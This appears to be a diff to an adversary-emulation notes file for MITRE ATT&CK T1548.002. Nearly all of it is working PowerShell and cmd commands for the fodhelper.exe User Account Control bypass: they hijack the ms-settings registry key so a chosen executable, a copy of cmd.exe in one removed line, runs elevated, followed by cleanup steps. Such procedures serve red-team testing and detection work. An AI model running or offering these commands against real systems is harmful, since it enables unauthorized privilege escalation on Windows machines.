@@ -1,3 +1,4 @@
+Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002)
 
 POWERSHELL
 -------------------------------------------------------
@@ -8,8 +9,10 @@ New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $env:USERPROFILE\desktop\123.exe;
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden;
 
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force;
 
+
+CLEAN UP
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force;
 -------------------------------------------------------
 
 
@@ -24,10 +27,10 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%USERPROFILE%\Desktop\123.exe" /f
 start /b "" "C:\Windows\System32\fodhelper.exe"
 
+
+
+CLEAN UP
 reg delete HKCU\Software\Classes\ms-settings /f /va
 del %USERPROFILE%\desktop\123.exe
 -------------------------------------------------------
 
--------------------------------------------------------
-copy c:\windows\system32\cmd.exe %USERPROFILE%\desktop\123.exe & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%USERPROFILE%\Desktop\123.exe" /f & start /b "" "C:\Windows\System32\fodhelper.exe" & reg delete HKCU\Software\Classes\ms-settings /f /va & del %USERPROFILE%\desktop\123.exe
--------------------------------------------------------
